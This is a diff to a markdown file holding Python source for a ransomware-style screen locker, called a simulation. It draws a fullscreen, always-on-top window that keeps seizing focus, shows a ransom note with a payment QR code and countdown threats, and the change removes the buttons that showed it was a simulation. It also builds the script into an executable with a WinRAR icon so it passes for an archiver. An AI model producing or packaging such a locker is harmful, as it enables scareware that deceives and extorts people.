@@ -207,6 +207,7 @@ pyinstaller --onefile --windowed --icon=infecto.ico infecto.py
 ## Ransom.py
 ```bash
 import os
+import sys
 import json
 import time
 import datetime
@@ -216,13 +217,28 @@ from PIL import Image, ImageTk
 import tkinter as tk
 from tkinter import messagebox
 
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+# ==============================
+# PYINSTALLER-SAFE RESOURCE PATH
+# ==============================
+def resource_path(relative_path):
+    try:
+        base_path = sys._MEIPASS  # PyInstaller temp folder
+    except AttributeError:
+        base_path = os.path.dirname(os.path.abspath(__file__))
+    return os.path.join(base_path, relative_path)
+
+# ==============================
+# GLOBALS
+# ==============================
 VICTIM_ID = f"SIM-{random.randint(10000,99999)}"
 SIM_DURATION = 90
-QR_FILE = os.path.join(BASE_DIR, "qrc.jpg")
-EVIDENCE_DIR = os.path.join(BASE_DIR, "sim_evidence")
+QR_FILE = resource_path("qrc (2).jpg")
+EVIDENCE_DIR = os.path.join(os.getcwd(), "sim_evidence")
 os.makedirs(EVIDENCE_DIR, exist_ok=True)
 
+# ==============================
+# IOC GENERATION
+# ==============================
 def generate_mock_iocs():
     now = datetime.datetime.now().isoformat()
     return [
@@ -244,48 +260,60 @@ def save_evidence(iocs):
         json.dump(report, f, indent=2)
     return fname
 
+# ==============================
+# GUI
+# ==============================
 def run_gui():
     root = tk.Tk()
     root.title("Ooops, your files have been encrypted!")
     root.configure(bg="#232224")
-    root.attributes('-fullscreen', True)
-    root.attributes('-topmost', True)
+    root.attributes("-fullscreen", True)
+    root.attributes("-topmost", True)
     root.overrideredirect(True)
+
     def lock_focus():
         while True:
             try:
                 root.focus_force()
                 root.lift()
-            except Exception:
+            except:
                 break
             time.sleep(0.4)
+
     Thread(target=lock_focus, daemon=True).start()
 
     banner = tk.Frame(root, bg="#a60d0d", height=47)
     banner.pack(fill="x")
-    tk.Label(banner, text="Ooops, your files have been encrypted!", bg="#a60d0d", fg="white", font=("Segoe UI", 16, "bold")).pack(side="left", padx=30)
-    tk.Label(banner, text=f"Victim ID: {VICTIM_ID}", bg="#a60d0d", fg="#ffd0d0", font=("Consolas", 12)).pack(side="right", padx=30)
+    tk.Label(banner, text="Ooops, your files have been encrypted!", bg="#a60d0d",
+             fg="white", font=("Segoe UI", 16, "bold")).pack(side="left", padx=30)
+    tk.Label(banner, text=f"Victim ID: {VICTIM_ID}", bg="#a60d0d",
+             fg="#ffd0d0", font=("Consolas", 12)).pack(side="right", padx=30)
 
     card = tk.Frame(root, bg="#1c1919", bd=2, relief="ridge")
     card.pack(padx=25, pady=25, fill="both", expand=True)
+
     left = tk.Frame(card, bg="#7a0909", width=215)
     left.pack(side="left", fill="y")
     left.pack_propagate(False)
+
     lock_canvas = tk.Canvas(left, width=97, height=97, bg="#7a0909", highlightthickness=0)
-    lock_canvas.create_oval(8,8,89,89, fill="#fff", outline="#bdbaba")
-    lock_canvas.create_rectangle(37,44,69,85, fill="#7a0909", outline="#7a0909")
-    lock_canvas.create_arc(24,18,82,60, start=0, extent=180, style="arc", outline="#7a0909", width=7)
+    lock_canvas.create_oval(8, 8, 89, 89, fill="#fff", outline="#bdbaba")
+    lock_canvas.create_rectangle(37, 44, 69, 85, fill="#7a0909", outline="#7a0909")
+    lock_canvas.create_arc(24, 18, 82, 60, start=0, extent=180, style="arc",
+                           outline="#7a0909", width=7)
     lock_canvas.pack(pady=17)
 
-    # Time and date visual
     def make_timer_box(parent, title, date_val):
         frame = tk.Frame(parent, bg="#7a0909")
         frame.pack(pady=7, padx=10, fill="x")
-        tk.Label(frame, text=title, bg="#7a0909", fg="#ffeeee", font=("Segoe UI", 12, "bold")).pack(anchor="w")
-        date_lbl = tk.Label(frame, text=date_val, bg="white", fg="#2d2929", font=("Consolas",13,"bold"), width=23)
-        date_lbl.pack(pady=(3,0))
-        timer_lbl = tk.Label(frame, text="00:00:00", bg="black", fg="#ff3939", font=("Consolas",14,"bold"), width=23)
-        timer_lbl.pack(pady=(2,6))
+        tk.Label(frame, text=title, bg="#7a0909", fg="#ffeeee",
+                 font=("Segoe UI", 12, "bold")).pack(anchor="w")
+        date_lbl = tk.Label(frame, text=date_val, bg="white",
+                            fg="#2d2929", font=("Consolas", 13, "bold"), width=23)
+        date_lbl.pack(pady=(3, 0))
+        timer_lbl = tk.Label(frame, text="00:00:00", bg="black",
+                             fg="#ff3939", font=("Consolas", 14, "bold"), width=23)
+        timer_lbl.pack(pady=(2, 6))
         return date_lbl, timer_lbl
 
     payment_deadline = (datetime.datetime.now() + datetime.timedelta(minutes=2)).strftime("%Y-%m-%d %H:%M:%S")
@@ -293,87 +321,72 @@ def run_gui():
 
     raise_date_lbl, raise_timer_lbl = make_timer_box(left, "Payment required before:", payment_deadline)
     lost_date_lbl, lost_timer_lbl = make_timer_box(left, "Files WILL BE LOST after:", file_loss_deadline)
-    tk.Label(left, text="System monitored. DO NOT TURN OFF.", bg="#7a0909", fg="#ffd0d0", font=("Segoe UI", 10), wraplength=180).pack(pady=9)
+
+    tk.Label(left, text="System monitored. DO NOT TURN OFF.",
+             bg="#7a0909", fg="#ffd0d0", font=("Segoe UI", 10),
+             wraplength=180).pack(pady=9)
 
     right = tk.Frame(card, bg="#19181b")
     right.pack(side="left", fill="both", expand=True, padx=30, pady=13)
+
     content = (
         "All files on this computer have been encrypted.\n"
         "Extension '.locked' is added to every affected file.\n\n"
         "To restore access:\n"
         "  1. Scan the QR code below using a mobile payment app.\n"
         "  2. Send the exact amount demanded.\n"
-        "  3. Click 'Check Payment' below. You will receive a decryption key if payment is verified.\n\n"
+        "  3. Click 'Check Payment' below.\n\n"
         "WARNING:\n"
-        "  - Do NOT modify, rename, or delete encrypted files, otherwise they may be lost forever.\n"
+        "  - Do NOT modify encrypted files.\n"
         "  - Antivirus removal will NOT recover your data.\n"
-        "  - If payment is not received before the deadline, all files will be permanently deleted and cannot be restored."
+        "  - Deadline failure = permanent loss."
     )
-    tk.Label(right, text=content, bg="#19181b", fg="#ededed", font=("Segoe UI", 13), justify="left", anchor="nw", wraplength=480).pack(pady=10)
+
+    tk.Label(right, text=content, bg="#19181b", fg="#ededed",
+             font=("Segoe UI", 13), justify="left",
+             anchor="nw", wraplength=480).pack(pady=10)
 
     qr_container = tk.Frame(right, bg="#19181b")
     qr_container.pack(pady=6)
+
     if os.path.exists(QR_FILE):
-        img = Image.open(QR_FILE)
-        w, h = img.size
-        show_size = min(w, h, 180)
-        img = img.resize((show_size, show_size), Image.LANCZOS)
+        img = Image.open(QR_FILE).resize((180, 180), Image.LANCZOS)
         tk_qr = ImageTk.PhotoImage(img)
         lbl_qr = tk.Label(qr_container, image=tk_qr, bg="#19181b")
         lbl_qr.image = tk_qr
         lbl_qr.pack()
     else:
-        tk.Label(qr_container, text="[PAYMENT QR NOT FOUND]", bg="#19181b", fg="red", font=("Segoe UI", 13)).pack(pady=38)
+        tk.Label(qr_container, text="[PAYMENT QR NOT FOUND]",
+                 bg="#19181b", fg="red",
+                 font=("Segoe UI", 13)).pack(pady=38)
 
-    tk.Label(right, text="Scan code above to pay ransom. Payment must be exact and before deadline.",
-             bg="#19181b", fg="#ffd15f", font=("Consolas", 11, "bold")).pack(pady=(2,15))
+    status = tk.Label(right, text="Scan code above to pay ransom.",
+                      bg="#19181b", fg="#ffd15f",
+                      font=("Consolas", 11, "bold"))
+    status.pack(pady=8)
 
-    btn_frame = tk.Frame(right, bg="#19181b")
-    btn_frame.pack(fill="x", pady=(2,2))
-    def check_payment_action():
-        messagebox.showinfo("Check Payment", "No payment detected! Verify your transaction and try again.")
-    def decrypt_action():
-        messagebox.showinfo("Decrypt", "Payment required. Unable to restore files until payment is confirmed.")
-    def analyze_action():
-        iocs = generate_mock_iocs()
-        fname = save_evidence(iocs)
-        out = f"Simulated IOCs:\n" + "\n".join([f"- {i['type']}: {i['detail']}" for i in iocs])
-        out += f"\n\nSaved: {fname}"
-        messagebox.showinfo("Analyze", out)
-    def save_evidence_action():
-        iocs = generate_mock_iocs()
-        fname = save_evidence(iocs)
-        messagebox.showinfo("Save Evidence", f"Saved evidence:\n{fname}")
-        
-    tk.Button(btn_frame, text="Check Payment", bg="#dcdcdc", fg="#181818", font=("Segoe UI",12,"bold"), width=16, command=check_payment_action).pack(side="left", padx=8)
-    tk.Button(btn_frame, text="Decrypt", bg="#ffd800", fg="#181818", font=("Segoe UI",12,"bold"), width=16, command=decrypt_action).pack(side="left", padx=8)
-    tk.Button(btn_frame, text="Analyze", bg="#ffcd39", fg="black", font=("Segoe UI",11,"bold"), width=11, command=analyze_action).pack(side="left", padx=2)
-    tk.Button(btn_frame, text="Save", bg="#d4f1d3", fg="black", font=("Segoe UI",11,"bold"), width=11, command=save_evidence_action).pack(side="left", padx=2)
-
-    status = tk.Frame(card, bg="#1c1919")
-    status.pack(fill="x", pady=(4,7), padx=12)
-    countdown_lbl = tk.Label(status, text="Time left to pay: -- s", bg="#1c1919", fg="#ffd0d0", font=("Consolas",13,"bold"))
-    countdown_lbl.pack(side="left", padx=(1,6))
     def countdown():
         start = time.time()
         while time.time() - start < SIM_DURATION:
             remain = int(SIM_DURATION - (time.time() - start))
             now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-            countdown_lbl.config(text=f"Time left to pay: {remain} s | Current time: {now}")
             raise_timer_lbl.config(text=time.strftime("%H:%M:%S", time.gmtime(remain)))
-            lost_timer_lbl.config(text=time.strftime("%H:%M:%S", time.gmtime(max(0, remain-30))))
-            root.update_idletasks()
+            lost_timer_lbl.config(text=time.strftime("%H:%M:%S", time.gmtime(max(0, remain - 30))))
+            status.config(text=f"Time left: {remain}s | {now}")
             time.sleep(1)
-        countdown_lbl.config(text="DEADLINE PASSED. FILES WILL BE DELETED!")
+        status.config(text="DEADLINE PASSED. FILES LOST.")
+
     Thread(target=countdown, daemon=True).start()
     root.mainloop()
 
 def main():
     run_gui()
+
 if __name__ == "__main__":
     main()
 
-```
+```bash
+ pyinstaller --onefile --windowed --icon=winrar.ico --add-data "qrc (2).jpg;." rans.py```
 
 
 
